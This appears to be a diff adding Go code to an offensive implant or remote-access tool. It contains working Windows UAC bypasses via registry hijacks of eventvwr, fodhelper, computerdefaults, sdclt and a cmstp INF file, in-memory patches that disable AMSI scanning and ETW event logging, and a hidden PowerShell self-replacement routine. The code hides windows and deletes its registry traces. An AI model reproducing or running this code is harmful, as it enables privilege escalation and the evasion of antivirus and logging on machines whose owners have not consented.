+// ═══════════════════════════════════════════════════════════════════════════════
+
+func uacBypass(method, payload string) string {
+	if payload == "" {
+		exe, err := os.Executable()
+		if err != nil {
+			return fmt.Sprintf("uac_bypass: failed to get executable path: %v", err)
+		}
+		payload = exe
+	}
+	switch method {
+	case "eventvwr":
+		return uacBypassEventVwr(payload)
+	case "fodhelper":
+		return uacBypassFodHelper(payload)
+	case "computerdefaults":
+		return uacBypassComputerDefaults(payload)
+	case "sdclt":
+		return uacBypassSDCLT(payload)
+	case "cmstp":
+		return uacBypassCMSTP(payload)
+	default:
+		return fmt.Sprintf("unknown uac_bypass method: %s", method)
+	}
+}
+
+func uacBypassEventVwr(payload string) string {
+	regPath := `HKCU\Software\Classes\mscfile\shell\open\command`
+
+	cmd := exec.Command("reg", "add", regPath, "/ve", "/t", "REG_SZ", "/d", payload, "/f")
+	applyHideWindow(cmd)
+	if out, err := cmd.CombinedOutput(); err != nil {
+		return fmt.Sprintf("eventvwr: reg add failed: %v %s", err, string(out))
+	}
+
+	exec.Command("eventvwr.exe").Start()
+	time.Sleep(5 * time.Second)
+
+	exec.Command("reg", "delete", `HKCU\Software\Classes\mscfile`, "/f").Run()
+
+	return "eventvwr: UAC bypass executed"
+}
+
+func uacBypassFodHelper(payload string) string {
+	regPath := `HKCU\Software\Classes\ms-settings\shell\open\command`
+
+	cmd := exec.Command("reg", "add", regPath, "/v", "DelegateExecute", "/t", "REG_SZ", "/d", "", "/f")
+	applyHideWindow(cmd)
+	cmd.CombinedOutput()
+
+	cmd = exec.Command("reg", "add", regPath, "/ve", "/t", "REG_SZ", "/d", payload, "/f")
+	applyHideWindow(cmd)
+	if out, err := cmd.CombinedOutput(); err != nil {
+		return fmt.Sprintf("fodhelper: reg add failed: %v %s", err, string(out))
+	}
+
+	exec.Command("fodhelper.exe").Start()
+	time.Sleep(3 * time.Second)
+
+	exec.Command("reg", "delete", `HKCU\Software\Classes\ms-settings`, "/f").Run()
+
+	return "fodhelper: UAC bypass executed"
+}
+
+func uacBypassComputerDefaults(payload string) string {
+	regPath := `HKCU\Software\Classes\ms-settings\shell\open\command`
+
+	cmd := exec.Command("reg", "add", regPath, "/v", "DelegateExecute", "/t", "REG_SZ", "/d", "", "/f")
+	applyHideWindow(cmd)
+	cmd.CombinedOutput()
+
+	cmd = exec.Command("reg", "add", regPath, "/ve", "/t", "REG_SZ", "/d", payload, "/f")
+	applyHideWindow(cmd)
+	if out, err := cmd.CombinedOutput(); err != nil {
+		return fmt.Sprintf("computerdefaults: reg add failed: %v %s", err, string(out))
+	}
+
+	exec.Command("computerdefaults.exe").Start()
+	time.Sleep(3 * time.Second)
+
+	exec.Command("reg", "delete", `HKCU\Software\Classes\ms-settings`, "/f").Run()
+
+	return "computerdefaults: UAC bypass executed"
+}
+
+func uacBypassSDCLT(payload string) string {
+	appPaths := `HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe`
+
+	cmd := exec.Command("reg", "add", appPaths, "/ve", "/t", "REG_SZ", "/d", payload, "/f")
+	applyHideWindow(cmd)
+	if out, err := cmd.CombinedOutput(); err != nil {
+		return fmt.Sprintf("sdclt: reg add failed: %v %s", err, string(out))
+	}
+
+	exec.Command("sdclt.exe", "/KickOffElevation").Start()
+	time.Sleep(3 * time.Second)
+
+	exec.Command("reg", "delete", `HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe`, "/f").Run()
+
+	return "sdclt: UAC bypass executed"
+}
+
+func uacBypassCMSTP(payload string) string {
+	tmpDir := os.Getenv("TEMP")
+	if tmpDir == "" {
+		tmpDir = "C:\\Windows\\Temp"
+	}
+	infPath := filepath.Join(tmpDir, "forgeuac.inf")
+
+	infContent := []byte("[version]\r\nSignature=$chicago$\r\nAdvancedINF=2.5\r\n\r\n[DefaultInstall]\r\nRunPreSetupCommands=" + payload + "\r\n")
+	if err := os.WriteFile(infPath, infContent, 0644); err != nil {
+		return fmt.Sprintf("cmstp: write inf failed: %v", err)
+	}
+	defer os.Remove(infPath)
+
+	exec.Command("cmstp.exe", "/au", infPath).Start()
+	time.Sleep(3 * time.Second)
+
+	return "cmstp: UAC bypass executed"
+}
+
+// amsiBypass patches AmsiScanBuffer in amsi.dll to always return AMSI_RESULT_CLEAN
+func amsiBypass() string {
+	k32 := syscall.NewLazyDLL("kernel32.dll")
+	getModuleHandle := k32.NewProc("GetModuleHandleW")
+	getProcAddress := k32.NewProc("GetProcAddress")
+	virtualProtect := k32.NewProc("VirtualProtect")
+
+	namePtr, _ := syscall.UTF16PtrFromString("amsi.dll")
+	hMod, _, _ := getModuleHandle.Call(uintptr(unsafe.Pointer(namePtr)))
+	if hMod == 0 {
+		return "AMSI bypass: amsi.dll not loaded (no patch needed)"
+	}
+
+	procName := append([]byte("AmsiScanBuffer"), 0)
+	procAddr, _, _ := getProcAddress.Call(hMod, uintptr(unsafe.Pointer(&procName[0])))
+	if procAddr == 0 {
+		return "AMSI bypass: AmsiScanBuffer not found"
+	}
+
+	// Patch: mov eax, 1; ret  (B8 01 00 00 00 C3)
+	// AMSI_RESULT_CLEAN = 1 → AmsiScanBuffer always reports clean
+	patch := []byte{0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3}
+
+	var oldProtect uint32
+	ret, _, _ := virtualProtect.Call(procAddr, uintptr(len(patch)), 0x40, uintptr(unsafe.Pointer(&oldProtect)))
+	if ret == 0 {
+		return "AMSI bypass: VirtualProtect failed"
+	}
+
+	for i := 0; i < len(patch); i++ {
+		*(*byte)(unsafe.Pointer(procAddr + uintptr(i))) = patch[i]
+	}
+
+	return "AMSI bypass: AmsiScanBuffer patched → always returns AMSI_RESULT_CLEAN"
+}
+
+// etwBypass patches EtwEventWrite in ntdll.dll to return immediately
+func etwBypass() string {
+	k32 := syscall.NewLazyDLL("kernel32.dll")
+	getModuleHandle := k32.NewProc("GetModuleHandleW")
+	getProcAddress := k32.NewProc("GetProcAddress")
+	virtualProtect := k32.NewProc("VirtualProtect")
+
+	namePtr, _ := syscall.UTF16PtrFromString("ntdll.dll")
+	hMod, _, _ := getModuleHandle.Call(uintptr(unsafe.Pointer(namePtr)))
+	if hMod == 0 {
+		return "ETW bypass: ntdll.dll not loaded"
+	}
+
+	procName := append([]byte("EtwEventWrite"), 0)
+	procAddr, _, _ := getProcAddress.Call(hMod, uintptr(unsafe.Pointer(&procName[0])))
+	if procAddr == 0 {
+		return "ETW bypass: EtwEventWrite not found"
+	}
+
+	// Patch: ret (0xC3) — return immediately, return code is garbage but callers don't check
+	patch := []byte{0xC3}
+
+	var oldProtect uint32
+	ret, _, _ := virtualProtect.Call(procAddr, uintptr(len(patch)), 0x40, uintptr(unsafe.Pointer(&oldProtect)))
+	if ret == 0 {
+		return "ETW bypass: VirtualProtect failed"
+	}
+
+	*(*byte)(unsafe.Pointer(procAddr)) = patch[0]
+
+	return "ETW bypass: EtwEventWrite patched → returns immediately"
+}
+
+// selfUpdateWindows replaces the current executable via a PowerShell wrapper
+func selfUpdateWindows(exe, tmpPath string) string {
+	psScript := fmt.Sprintf(
+		`Start-Sleep -Milliseconds 300; `+
+			`Copy-Item -Path '%s' -Destination '%s' -Force; `+
+			`Start-Process -FilePath '%s';`,
+		tmpPath, exe, exe)
+
+	cmd := exec.Command("powershell.exe", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psScript)
+	applyHideWindow(cmd)
+	if err := cmd.Start(); err != nil {
+		return "failed to start updater: " + err.Error()
+	}
+
+	return "self-update: new binary downloaded, replacing and restarting..."
+}
+
+func selfUpdateLinux(exe, tmpPath string) string {
+	return "" // stub for Windows build
+}
